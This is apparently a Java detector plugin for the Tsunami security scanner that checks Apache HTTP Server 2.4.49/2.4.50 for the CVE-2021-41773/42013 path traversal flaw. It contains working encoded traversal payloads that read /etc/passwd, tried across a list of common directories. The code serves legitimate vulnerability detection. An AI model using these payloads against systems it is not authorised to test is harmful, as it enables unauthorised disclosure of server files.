package com.google.tsunami.plugins.detectors.rce.cve202125646;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.base.Preconditions.checkState;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.auto.value.AutoValue;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.Optional;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2021-41773 and CVE-2021-42013 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "ApacheHttpServerCVE202141773VulnDetector",
    version = "1.0",
    description =
        "This detector checks for Apache HTTP Server 2.4.49 Path traversal and "
            + "disclosure vulnerability.",
    author = "threedr3am (qiaoer1320@gmail.com)",
    bootstrapModule = ApacheHttpServerCVE202141773VulnDetectorBootstrapModule.class)
public class ApacheHttpServerCVE202141773VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;

  private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("root:[x*]:0:0:");
  private static final ImmutableList<String> COMMON_DIRECTORIES =
      ImmutableList.of(
          "admin",
          "album",
          "app",
          "assets",
          "bin",
          "console",
          "css",
          "cgi-bin",
          "demo",
          "doc",
          "eqx",
          "files",
          "fs",
          "html",
          "img-sys",
          "jquery_ui",
          "js",
          "media",
          "public",
          "static",
          "tmp",
          "upload",
          "xls",
          "scripts");
  private static final ImmutableList<String> COMMON_PAYLOADS =
      ImmutableList.of(
          "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e"
              + "/%2e%2e/etc/passwd",
          "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65"
              + "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65"
              + "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd");

  @Inject
  ApacheHttpServerCVE202141773VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .map(this::checkService)
                .filter(CheckResult::isVulnerable)
                .map(checkResult -> buildDetectionReport(targetInfo, checkResult))
                .collect(toImmutableList()))
        .build();
  }

  private CheckResult checkService(NetworkService networkService) {
    for (String dir : COMMON_DIRECTORIES) {
      for (String payload : COMMON_PAYLOADS) {
        CheckResult checkResult = checkUrlWithCommonDirectory(networkService, dir, payload);
        if (checkResult.isVulnerable()) {
          return checkResult;
        }
      }
    }
    return CheckResult.buildForSecureService(networkService);
  }

  private CheckResult checkUrlWithCommonDirectory(
      NetworkService networkService, String directory, String payload) {
    String targetUri =
        String.format(
            "%s%s%s",
            NetworkServiceUtils.buildWebApplicationRootUrl(networkService), directory, payload);
    try {
      HttpResponse response = httpClient.sendAsIs(get(targetUri).withEmptyHeaders().build());
      Optional<String> body = response.bodyString();
      if (response.status() == HttpStatus.OK
          && body.isPresent()
          && VULNERABILITY_RESPONSE_PATTERN.matcher(body.get()).find()) {
        logger.atInfo().log("Received vulnerable response from target %s.", targetUri);
        return CheckResult.buildForVulnerableDetection(networkService, targetUri, response);
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return CheckResult.buildForSecureService(networkService);
  }

  private DetectionReport buildDetectionReport(TargetInfo targetInfo, CheckResult checkResult) {
    NetworkService vulnerableNetworkService = checkResult.networkService();
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2021_41773"))
                .setSeverity(Severity.HIGH)
                .setTitle("Apache HTTP Server 2.4.49 Path traversal and disclosure vulnerability")
                .setDescription(
                    "A flaw was found in a change made to path normalization in Apache HTTP Server "
                        + "2.4.49. An attacker could use a path traversal attack to map URLs to "
                        + "files outside the expected document root. "
                        + "If files outside of the document root "
                        + "are not protected by \"require all denied\" these requests can succeed. "
                        + "Additionally this flaw could leak the source of interpreted files "
                        + "like CGI scripts. "
                        + "This issue is known to be exploited in the wild. "
                        + "This issue affects Apache 2.4.49 and 2.4.50 but not earlier versions. "
                        + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773 "
                        + "https://httpd.apache.org/security/vulnerabilities_24.html")
                .setRecommendation("Update to 2.4.51 release.")
                .addAdditionalDetails(buildAdditionalDetail(checkResult)))
        .build();
  }

  private AdditionalDetail buildAdditionalDetail(CheckResult checkResult) {
    checkState(checkResult.isVulnerable());
    checkState(checkResult.vulnerableUrl().isPresent());
    checkState(checkResult.response().isPresent());
    HttpResponse response = checkResult.response().get();
    StringBuilder reportBuilder = new StringBuilder();
    reportBuilder
        .append("Vulnerable target:\n")
        .append(checkResult.vulnerableUrl().get())
        .append("\n\nResponse:\n")
        .append(response.status().code())
        .append(' ')
        .append(response.status())
        .append('\n');
    response
        .headers()
        .names()
        .forEach(
            headerName ->
                response
                    .headers()
                    .getAll(headerName)
                    .forEach(
                        headerValue ->
                            reportBuilder
                                .append(headerName)
                                .append(": ")
                                .append(headerValue)
                                .append('\n')));
    response.bodyString().ifPresent(body -> reportBuilder.append('\n').append(body));
    return AdditionalDetail.newBuilder()
        .setTextData(TextData.newBuilder().setText(reportBuilder.toString()))
        .build();
  }

  @AutoValue
  abstract static class CheckResult {
    abstract boolean isVulnerable();
    abstract NetworkService networkService();
    abstract Optional<String> vulnerableUrl();
    abstract Optional<HttpResponse> response();

    static CheckResult buildForVulnerableDetection(
        NetworkService networkService, String url, HttpResponse response) {
      return new AutoValue_ApacheHttpServerCVE202141773VulnDetector_CheckResult(
          true, networkService, Optional.of(url), Optional.of(response));
    }

    static CheckResult buildForSecureService(NetworkService networkService) {
      return new AutoValue_ApacheHttpServerCVE202141773VulnDetector_CheckResult(
          false, networkService, Optional.empty(), Optional.empty());
    }
  }
}
